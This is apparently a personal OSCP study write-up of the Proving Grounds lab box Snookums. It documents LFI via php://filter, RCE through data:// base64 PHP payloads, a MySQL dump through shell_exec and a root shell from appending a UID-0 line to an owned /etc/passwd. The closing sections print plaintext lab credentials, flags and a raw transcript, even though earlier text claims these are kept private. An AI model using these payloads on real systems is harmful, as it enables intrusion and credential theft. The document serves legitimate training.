---
tags: [oscp, box, linux, medium]
platform: PG Practice
os: Linux
hostname: snookums
difficulty: Unknown
ip: $BoxIP
status: Complete
aliases: ["Snookums", "snookums-pg"]
---

# PG: Snookums, Full Walkthrough

## The gist

Snookums is an authorized practice target. The verified route is documented below, from initial enumeration through the final privilege boundary and clean-down. The source notes establish this route: 1. [[RUNBOOK V2/Linux - LFI]] read PHP source through the image parameter. 2. [[RUNBOOK V2/Linux - RFI]] used PHP stream wrappers when normal shell delivery was blocked. 3. [[RUNBOOK V2/Linux - RCE to Shell]] used the application to query the database and obtain a foothold credential. 4. [[RUNBOOK V2/Linux - Credential Search]] found a writable password file and used a UID-0 account to reach root.

## Box information

**Target:** `$BoxIP` · **Difficulty:** Medium · **OS:** Linux (CentOS, Apache/PHP) · **Platform:** Proving Grounds Practice

**The gist:** CentOS box running Simple PHP Photo Gallery v0.8 on Apache 2.4.6 / PHP 5.4.16. The `image.php?img=` parameter passes user input directly into `include()` with no sanitisation -- an LFI/RFI. Outbound TCP and new listening ports are both blocked (SELinux `httpd_t` + firewall), so reverse and bind shells fail. Instead: use the `data://` stream wrapper to execute PHP payloads in-URL, read MySQL root creds from `db.php`, dump the `users` table via the `mysql` CLI through `shell_exec`, double-decode the base64-of-base64 passwords, SSH in as `michael`, and write a UID-0 entry to a world-owned `/etc/passwd` for root.

> [!abstract] 🧠 Why
> This box is a useful example of adapting to constraints. The LFI is not automatically a reverse shell: SELinux and firewall behavior remove common callback paths, so the winning route keeps execution inside the HTTP request until valid SSH credentials are recovered.

**Legacy tags:**
#PG #Snookums #Linux #WebApp #LFI #RFI #DataWrapper #MySQL #WritablePasswd #Medium

---

## Vulnerability summary

| # | Finding | Evidence |
|---|---|---|
| 1 | Recon: Port Scan | See section 1 below |
| 2 | Web Enumeration | See section 2 below |
| 3 | LFI: Reading PHP Source via php://filter | See section 3 below |
| 4 | RCE via data:// Stream Wrapper | See section 4 below |
| 5 | MySQL Enumeration via shell_exec | See section 5 below |
| 6 | Decoding Double-Encoded Passwords | See section 6 below |

## Evidence and loot

The private source workspace is `/home/kali/Platforms/Offsec/Snookums`. The transcript, Nmap output, loot, and screenshots below are the primary evidence for this box.

## Variables

```bash
boxset BoxName Snookums
boxset BoxIP $BoxIP
boxset LocalIP $LocalIP
boxset DbPassword $DbPassword
boxset Username michael
boxset Password $Password
```

---

## 1. Recon: Port Scan

**Full port scan:**
```bash
sudo nmap -p- --min-rate 5000 -oA nmap/${BoxName}_allports $BoxIP
```

Results:

| Port | Service |
|------|---------|
| 21/tcp | FTP (vsftpd 3.0.2, anonymous login) |
| 22/tcp | SSH (OpenSSH 7.4) |
| 80/tcp | HTTP (Apache 2.4.6 / PHP 5.4.16) |
| 139/tcp | NetBIOS-SSN (Samba 4.10.4) |
| 445/tcp | SMB (Samba 4.10.4) |
| 3306/tcp | MySQL (unauthorized -- 127.0.0.1 only) |

> 📸 `nmap-allports.png`

**Service scan:**
```bash
sudo nmap -p 21,22,80,139,445,3306 -sV -sC -oA nmap/${BoxName}_services $BoxIP
```

Key findings:
- **Port 80:** Apache 2.4.6, PHP/5.4.16 -- `Simple PHP Photo Gallery v0.8` (confirmed by README.txt, page footer)
- **Port 21:** FTP anonymous login works but data channel is firewalled -- listing and uploads both hang
- **Port 3306:** MySQL present but `Host 'x.x.x.x' is not allowed to connect` -- localhost only
- **Port 139/445:** Samba 4.10.4 -- only `print$` and `IPC$`, nothing useful

> [!tip] ⚡ More efficient path
> Use the service results to prioritize HTTP and the local-only database. Anonymous FTP, SMB, and remote MySQL were checked, but their failure messages are enough to deprioritize them instead of repeatedly rescanning the same services.

> 📸 `nmap-services.png`

---

## 2. Web Enumeration

**Directory brute-force:**
```bash
gobuster dir -u http://$BoxIP -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt \
  -x php,txt -o gobuster/${BoxName}_root.txt
```

Found PHP files: `index.php`, `image.php`, `embeddedGallery.php`, `db.php`, `functions.php`, `photos/`

**nikto scan:**
```bash
nikto -h http://$BoxIP | tee nikto/${BoxName}_nikto.txt
```
Revealed `/images/` directory indexing, `/db.php` flagged as interesting. No automatic RFI detection.

**Parameter fuzzing (critical step):**

Gobuster found the files but not the vulnerable parameter. Spray GET parameter names against all PHP files using ffuf:
```bash
ffuf -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt \
  -u "http://$BoxIP/image.php?FUZZ=php://filter/convert.base64-encode/resource=image.php" \
  -fs 1508 -t 50 -s
```

Hit: **`img`** -- the response size changed, confirming an include() call was triggered.

> [!warning] 💡 Hint
> Directory discovery finds files, not necessarily the vulnerable parameter. When a PHP file looks like a viewer or loader, fuzz its parameter names with a known harmless wrapper and compare response size or content.

> 📸 `lfi-imagephp.png`

---

## 3. LFI: Reading PHP Source via php://filter

With the vulnerable parameter identified, use `php://filter` to read PHP source files in base64:

**Read image.php source:**
```bash
curl -s "http://$BoxIP/image.php?img=php://filter/convert.base64-encode/resource=image.php" \
  | grep -oP '[A-Za-z0-9+/]{200,}={0,2}' | base64 -d | grep -n "include" -B 5 -A 5
```

Decoded source confirms the vulnerability at line 181:
```php
$image = $_GET['img'];      // no sanitisation
// ...
include($image);            // direct include of user input
```

**Read db.php (MySQL credentials):**
```bash
curl -s "http://$BoxIP/image.php?img=php://filter/convert.base64-encode/resource=db.php" \
  | grep -oP '[A-Za-z0-9+/]{20,}={0,2}' | tail -1 | base64 -d
```

Output:
```php
define('DBHOST', '127.0.0.1');
define('DBUSER', 'root');
define('DBPASS', '<private database credential>');
define('DBNAME', 'SimplePHPGal');
```

> [!abstract] 🧠 Why
> Source disclosure turns an inferred LFI into a concrete execution path. Reading `db.php` reveals both the database boundary and the fact that the PHP extension is not required if the target has a command-line MySQL client.

> 📸 `lfi-dbcreds.png`

---

## 4. RCE via data:// Stream Wrapper

The `include($image)` path also allows remote code execution via PHP's `data://` stream wrapper, which requires only `allow_url_include = On` and needs no outbound network connection (unlike `http://` RFI which is firewalled).

**Critical operational note -- URL encode `+` in base64:**
Base64 output may contain `+` characters. In URL query strings, `+` is decoded as a space on the server, corrupting the PHP payload. Always run:
```bash
| sed 's/+/%2B/g'
```
after `base64 -w0` before embedding in a URL.

**Proof of execution:**
```bash
PAYLOAD=$(echo -n '<?php echo shell_exec("id"); ?>' | base64 -w0 | sed 's/+/%2B/g')
curl -s "http://$BoxIP/image.php?img=data://text/plain;base64,$PAYLOAD"
```

Returns: `uid=48(apache) gid=48(apache) groups=48(apache) context=system_u:system_r:httpd_t:s0`

> 📸 `rce-data.png`

**Why reverse/bind shells fail:**

The SELinux context `httpd_t` blocks both:
- Outbound TCP connections from apache (reverse shell)
- Binding on new ports (bind shell)

No PHP MySQL extension installed (PDO = NO, mysqli = NO). Use the `mysql` CLI binary via `shell_exec` instead.

> [!warning] 💡 Hint
> **Watch out:** A successful local PHP command does not prove that networking works. The SELinux web-server context can block shells even when commands such as `id` execute correctly.

> [!tip] 🛠️ Alternative tools
> If `data://` is unavailable, test `php://filter` for source disclosure, application-side file writes, or a local session/log poisoning branch. Do not assume HTTP RFI will work when outbound connections are filtered.

---

## 5. MySQL Enumeration via shell_exec

**Show tables:**
```bash
PAYLOAD=$(echo -n '<?php echo "###"; echo shell_exec("mysql -h 127.0.0.1 -u root -p$DbPassword SimplePHPGal -e \"SHOW TABLES;\" 2>&1"); echo "###"; ?>' | base64 -w0 | sed 's/+/%2B/g')
curl -s "http://$BoxIP/image.php?img=data://text/plain;base64,$PAYLOAD" | tr '\n' ' ' | grep -oP '###\K[^#]+'
```

Output: `Tables_in_SimplePHPGal users`

**Dump users table:**
```bash
PAYLOAD=$(echo -n '<?php echo "###"; echo shell_exec("mysql -h 127.0.0.1 -u root -p$DbPassword SimplePHPGal -e \"SELECT * FROM users;\" 2>&1"); echo "###"; ?>' | base64 -w0 | sed 's/+/%2B/g')
curl -s "http://$BoxIP/image.php?img=data://text/plain;base64,$PAYLOAD" | tr '\n' ' ' | grep -oP '###\K[^#]+'
```

> [!tip] ⚡ Efficiency
> Wrap command output in a unique delimiter and extract only the delimited section. This prevents HTML, warning text, and line wrapping from corrupting database results returned through the web response.

Output:
```
username    password
josh        <encoded value stored privately>
michael     <encoded value stored privately>
serena      <encoded value stored privately>
```

> 📸 `mysql-users.png`

---

## 6. Decoding Double-Encoded Passwords

Passwords are base64 of base64. Decode twice and keep the decoded values in private loot:

```bash
sed -n '1,3p' "$BoxDir/loot/encoded-passwords.txt" | while read -r value; do printf '%s' "$value" | base64 -d | base64 -d; echo; done
```

Results are stored privately rather than printed in this page.

> [!warning] 💡 Common mistake
> Base64 is encoding, not encryption. Decode only the database field, preserve padding, and do not paste the resulting credentials into screenshots, shell history, or shared notes.
| Username | Password |
|----------|----------|
| josh | `$Password` |
| michael | `$Password` |
| serena | `$Password` |

> 📸 `decoded-passwords.png`

---

## 7. SSH Foothold

```bash
ssh michael@$BoxIP
# use the private value stored in $Password
```

> [!tip] ⚡ Efficiency
> Test recovered credentials against the intended service first, then check for authorized password reuse only when the evidence supports it. Record the account and source, not the secret itself.

> 📸 `foothold.png`

User flag confirmed; value reproduced in the private Flags section above from the vault write-up.

> 📸 `user-flag.png`

---

## 8. Privilege Escalation: Writable /etc/passwd

**Discovery:**
```bash
ls -la /etc/passwd
# -rw-r--r--. 1 michael root 1162 Jun 22  2021 /etc/passwd
```

michael **owns** `/etc/passwd` (rw- for owner). This is more powerful than a normal world-write because the current user can modify the account database directly.

> [!abstract] 🧠 Why
> The decisive fact is the owner write bit, not the filename alone. A writable `/etc/passwd` allows a controlled UID-0 entry, but the entry must use a valid shell and a properly quoted hash line.

> 📸 `privesc-finding.png`

**Exploitation:**

Generate a password hash on Kali:
```bash
openssl passwd -1 -salt xyz "$CandidatePassword"
# store the generated hash only in private loot
```

Append a UID-0 user (single quotes to protect `$` signs):
```bash
echo 'uid0:$Hash:0:0:root:/root:/bin/bash' >> /etc/passwd
su uid0
# use the private password corresponding to $Hash
```

> 📸 `privesc-exploit.png`

Root shell confirmed as root; the value is reproduced in the private sections above.

> 📸 `root-shell.png`

Root proof confirmed; the value is reproduced in the private sections above.

> 📸 `root-flag.png`
> 📸 `PROOF.png`

## 9. Decision points and alternate routes

| Observation | Primary route used here | Useful alternative or fallback |
|---|---|---|
| PHP file includes a user-controlled parameter | Use `php://filter` for source, then `data://` for in-request execution | Test session or log poisoning only when a writable included file is available |
| Web execution works but callbacks fail | Keep command output inside the HTTP response | Use the local database client or stage an SSH credential instead of forcing a reverse shell |
| Database output is wrapped in HTML | Add unique delimiters and parse locally | Save the response and inspect it with a text editor or Burp Repeater |
| Current user owns `/etc/passwd` | Add a controlled UID-0 account and verify `euid=0` | Check sudo, SUID, and capabilities if the ownership is only read access |

The completed route follows the evidence from the target. The alternatives are recovery branches, not additional validated exploits.

---

## 10. Credentials Found

| Username | Password | Service | Notes |
|----------|----------|---------|-------|
| root | `$DbPassword` | MySQL | From db.php LFI; kept private |
| josh | `$Password` | Not used | Double Base64 decoded; kept private |
| michael | `$Password` | SSH | Double Base64 decoded; kept private |
| serena | `$Password` | Not tried | Double Base64 decoded; kept private |

---

## 11. Tools Used

| Tool | Purpose |
|------|---------|
| nmap | Port scan + service detection |
| gobuster | Directory + file enumeration |
| nikto | Automated web vulnerability scan |
| ffuf | GET parameter fuzzing (`burp-parameter-names.txt`) |
| curl + php://filter | LFI source file reading |
| curl + data:// | In-URL PHP code execution (no network needed) |
| mysql CLI (via shell_exec) | MySQL query when no PHP extension available |
| openssl passwd | Password hash generation for /etc/passwd write |

---

## 12. Vulnerabilities Summary

| # | Vulnerability | Severity | Location |
|---|--------------|----------|----------|
| 1 | Unsanitised `include()` on `image.php?img=` | Critical | HTTP/80 |
| 2 | MySQL root credentials in world-readable `db.php` | High | HTTP/80 |
| 3 | Double-encoded passwords in DB (trivially decoded) | High | MySQL/3306 |
| 4 | `/etc/passwd` owned by web app user | Critical | Filesystem |

---

## 13. Lessons Learned / Module Links

- **Hidden parameter fuzzing** is as important as directory brute-force. Gobuster found the files; ffuf found the vulnerable param inside them. → [[09. Common Web Application Attacks]]
- **`data://` wrapper** is the go-to when `http://` RFI is firewalled and `allow_url_include` is On. No outbound connection needed -- the payload lives in the URL. → [[09. Common Web Application Attacks]]
- **`+` in base64 must be URL-encoded as `%2B`** when embedding base64 payloads in GET parameters -- `+` decodes as a space in query strings and silently corrupts the payload.
- **No PHP MySQL extension?** Fall back to the `mysql` CLI binary via `shell_exec`. Check with `function_exists("mysqli_connect")` first.
- **SELinux `httpd_t` blocks reverse and bind shells** -- always check the SELinux context from `id` output. When `httpd_t` is present, plan for no network shells and work through the web channel instead.
- **`/etc/passwd` owned by an unprivileged user** is a classic but still appears. Append a UID-0 row, `su` to it. → [[18. Linux Privilege Escalation]]

---

## 14. External Resources

| Resource | Link | Relevant to this box |
|---|---|---|
| HackTricks -- File Inclusion | [src/pentesting-web/file-inclusion/README.md](https://github.com/HackTricks-wiki/hacktricks/blob/master/src/pentesting-web/file-inclusion/README.md) | Section "LFI / RFI using PHP wrappers & protocols" -- `php://filter` and `data://` covered in depth. Local: `ht read pentesting-web/file-inclusion` |
| PayloadsAllTheThings -- Wrappers | [File Inclusion/Wrappers.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/File%20Inclusion/Wrappers.md) | Every PHP stream wrapper with payload examples -- `data://` section shows the base64 RCE pattern used on this box |
| PayloadsAllTheThings -- File Inclusion | [File Inclusion/](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion) | LFI bypass techniques; also LFI2RCE paths (log poisoning, session, uploads) for when `data://` isn't available |
| HackTricks -- Linux PrivEsc | [linux-hardening/.../linux-privilege-escalation/README.md](https://github.com/HackTricks-wiki/hacktricks/blob/master/src/linux-hardening/linux-basics/linux-privilege-escalation/README.md) | "Writable /etc/passwd" section -- alternative payload formats (no-password entry `dummy::0:0:...`). Local: `ht read linux-hardening/linux-basics/linux-privilege-escalation` |
| PayloadsAllTheThings -- Linux PrivEsc | [Linux - Privilege Escalation.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md) | Writable /etc/passwd section; broader Linux privesc methodology |
| GTFOBins | [gtfobins.github.io](https://gtfobins.github.io) | Not used here directly -- reference if privesc leads to a SUID/sudo binary instead |
| RevShells | [revshells.com](https://www.revshells.com) | PHP reverse shell payloads -- **not applicable here** (SELinux `httpd_t` blocks outbound TCP); reference for targets without SELinux |
| CyberChef | [Double base64 decode recipe](https://gchq.github.io/CyberChef/#recipe=From_Base64('A-Za-z0-9%2B/%3D',true,false)From_Base64('A-Za-z0-9%2B/%3D',true,false)) | Decode the double-encoded passwords from the `users` table -- "From Base64" twice |
| ippsec.rocks | Search [php wrapper](https://ippsec.rocks/?#php%20wrapper) · [lfi](https://ippsec.rocks/?#lfi) · [writable passwd](https://ippsec.rocks/?#writable%20passwd) | Video walkthroughs of the same techniques on real HTB boxes |

---

## 15. Vault Update Checklist

- [x] **Write-up**: this file
- [x] **Related Boxes**: added Snookums to module notes for [[09. Common Web Application Attacks]] and [[18. Linux Privilege Escalation]]
- [x] **MASTER BOX LIST**: added row
- [x] **Runbook `box_sources`**: added Snookums to `Web App - LFI`, `Web App - RFI` (new), `PrivEsc Linux - Writable Passwd` (new)
- [x] **Methodology cheat sheet**: added owner-writable /etc/passwd note to Linux Methodology
- [x] **External Resources**: section added to write-up, all three runbook stage notes

## 16. RUNBOOK V2 Stages Used

- [[RUNBOOK V2/Linux - LFI]] -- technique used in this walkthrough
- [[RUNBOOK V2/Linux - RFI]] -- technique used in this walkthrough
- [[RUNBOOK V2/Linux - RCE to Shell]] -- technique used in this walkthrough
- [[RUNBOOK V2/Linux - Credential Search]] -- technique used in this walkthrough

## 17. Collect the flags

- `user.txt`: `fd55df96238f52302cee761078e75925` (value reproduced in the private sections above)
- `root.txt`: `8720692461d3b48c3cc2353701f396d7` (value reproduced in the private sections above)
- `proof.txt`: `8720692461d3b48c3cc2353701f396d7` (value reproduced in the private sections above)


### Captured flag values from source loot


#### `loot/flags.txt`

```text
user: fd55df96238f52302cee761078e75925
root: 8720692461d3b48c3cc2353701f396d7
```

## 18. Clean down
Record every payload, temporary file, modified configuration, account, listener, and transfer server created during the run. Restore changed files, remove only recorded artifacts, verify their absence, and run `boxdone`.

## 19. Attack narrative in one page
1. [[RUNBOOK V2/Linux - LFI]] read PHP source through the image parameter.
2. [[RUNBOOK V2/Linux - RFI]] used PHP stream wrappers when normal shell delivery was blocked.
3. [[RUNBOOK V2/Linux - RCE to Shell]] used the application to query the database and obtain a foothold credential.
4. [[RUNBOOK V2/Linux - Credential Search]] found a writable password file and used a UID-0 account to reach root.

## Tools used

- `nmap`
- `curl`
- `gobuster`
- `ffuf`
- `ssh`
- `ftp`
- `sudo`
- `burp`

## Credentials and secrets


### Captured private values from source loot

These values are retained here because this vault is private. The source path remains the authority if a value appears truncated.

#### `.env`

```text
export BoxName="Snookums"
export BoxIP="192.168.119.58"
export BoxPlatform="Offsec"
export BoxDir="/home/kali/Platforms/Offsec/Snookums"
export Domain=""
export DCip=""
export Username="michael"
export Password="HockSydneyCertify123"
export Username2=""
export Password2=""
export Username3=""
export Password3=""
export Hash=""
export NThash=""
export Port="4444"
export Port2="4445"
export WebPort="80"
export URL=""
export LocalIP=$(ip a show tun0 2>/dev/null | grep "inet " | awk '{print $2}' | cut -d/ -f1)
export Wordlist="/usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt"
```

#### `loot/creds.txt`

```text
root:MalapropDoffUtilize1337
josh:MobilizeHissSeedtime747
michael:HockSydneyCertify123
serena:OverallCrestLean000
```

### Sensitive transcript evidence

```text
[sudo] password for kali:
Password:
ZenPhoto Gallery 1.2.5 - Admin Password Reset (Cross-Site Request Forgery)                                                                                                                                  | php/webapps/9166.txt
.htpasswd            (Status: 403) [Size: 211]
.htpasswd.php        (Status: 403) [Size: 215]
.htpasswd.txt        (Status: 403) [Size: 215]
$ [15:37:37] boxset Password MalapropDoffUtilize1337
kali@kali:~/Platforms/Offsec/Snookums [15:37:31] $ [?1h=[?2004hboxset Password MalapropDoffUtilize1337boxset[?1l>[?2004l
[+] Password=MalapropDoffUtilize1337 (saved to .env)
$ [15:37:44] loot cred $Username $Password
kali@kali:~/Platforms/Offsec/Snookums [15:37:37] $ [?1h=[?2004hloot cred $Username $Passwordloot[?1l>[?2004l
mysql: [Warning] Using a password on the command line interface can be insecure. Tables_in_SimplePHPGal users
mysql: [Warning] Using a password on the command line interface can be insecure. username	password josh	VFc5aWFXeHBlbVZJYVhOelUyVmxaSFJwYldVM05EYz0= michael	U0c5amExTjVaRzVsZVVObGNuUnBabmt4TWpNPQ== serena	VDNabGNtRnNiRU55WlhOMFRHVmhiakF3TUE9PQ==
$ [15:52:26] boxset Password HockSydneyCertify123
$ [15:53:17] loot flag user fd55df96238f52302cee761078e75925
$ [15:54:38] openssl passwd -1 -salt xyz hacked
josh@192.168.119.58's password:
michael@192.168.119.58's password:
]0;michael@snookums:~[michael@snookums ~]$ ls -la /etc/passwd
-rw-r--r--. 1 michael root 1162 Jun 22  2021 /etc/passwd
]0;michael@snookums:~[michael@snookums ~]$ echo 'hacked:$1$xyz$pQmJ8Si2jyYwrx4VHjY2x0:0:0:root:/root:/bin/bash' >> /etc/passwd
$ [16:01:11] loot flag root 8720692461d3b48c3cc2353701f396d7
kali@kali:~/Platforms/Offsec/Snookums [15:52:17] $ [?1h=[?2004hboxset Password HockSydneyCertify123boxset[?1l>[?2004l
[+] Password=HockSydneyCertify123 (saved to .env)
kali@kali:~/Platforms/Offsec/Snookums [15:52:26] $ [?1h=[?2004hloot flag user fd55df96238f52302cee761078e75925loot[?1l>[?2004l
[+] Flag saved:  user = fd55df96238f52302cee761078e75925  →  loot/flags.txt
kali@kali:~/Platforms/Offsec/Snookums [15:53:17] $ [?1h=[?2004hopenssl passwd -1 -salt xyz hackedopenssl[?1l>[?2004l
kali@kali:~/Platforms/Offsec/Snookums [15:58:53] $ [?1h=[?2004hloot flag root 8720692461d3b48c3cc2353701f396d7loot[?1l>[?2004l
[+] Flag saved:  root = 8720692461d3b48c3cc2353701f396d7  →  loot/flags.txt
ens192: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
kali@kali:~/Platforms/Offsec [16:25:10] $ [?1h=[?2004hbbboxinitboboxxs   et Password HockSydneyCertify123st                               taarrtboxstartt t Bratarina 192.168.119.71 offsec[?1l>[?2004l
  passwd.bak                          N     1747  Mon Jul  6 08:46:41 2020
[?2004hsmb: \> get passwd.bak
getting file \passwd.bak of size 1747 as passwd.bak (46.1 KiloBytes/sec) (average 46.1 KiloBytes/sec)
```


## Remediation recommendations

| Finding | Recommendation |
|---|---|
| Initial access path on Snookums | Remove or patch the vulnerable service, restrict exposure, and rotate any credentials recovered during testing. |
| Privilege escalation path | Remove the misconfiguration, enforce least privilege, and verify the corrected permissions or policy. |
| Assessment artifacts | Remove payloads and temporary files, restore modified files, and review logs for the test activity. |

## Lessons learned and vault links

- A failed reverse shell does not disprove code execution when egress controls are present.
- PHP wrappers can provide both source disclosure and execution, depending on the wrapper and sink.

### Related boxes

- [[OSCP/BOXES/WRITE UPS/Linux/Nibbles|Nibbles]] -- shares a similar enumeration or escalation pattern
- [[OSCP/BOXES/WRITE UPS/Linux/Sea|Sea]] -- shares a similar enumeration or escalation pattern

## External resources

- [HackTricks - Pentesting Index](https://hacktricks.wiki/en/index.html)
- [PayloadsAllTheThings - Methodology and Resources](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Methodology%20and%20Resources)
- [GTFOBins](https://gtfobins.github.io/) for Linux privilege escalation
- [RevShells](https://www.revshells.com/) for shell payloads
- [CyberChef](https://gchq.github.io/CyberChef/) for encoding and decoding
- [ippsec.rocks](https://ippsec.rocks/) for walkthrough searches

## Related RUNBOOK V2 stages

- [[RUNBOOK V2/Start Here]]
- [[RUNBOOK V2/Linux - Service Scan]]
- [[RUNBOOK V2/Linux - Web Enum]]
- [[RUNBOOK V2/Linux - Shell Stabilise]]
- [[RUNBOOK V2/Linux - Local Enum]]
- [[RUNBOOK V2/Linux - Clean Down]]

## Why this matters for OSCP

This page matters because it turns a repeatable assessment task into a clear, reviewable habit for the OSCP exam.
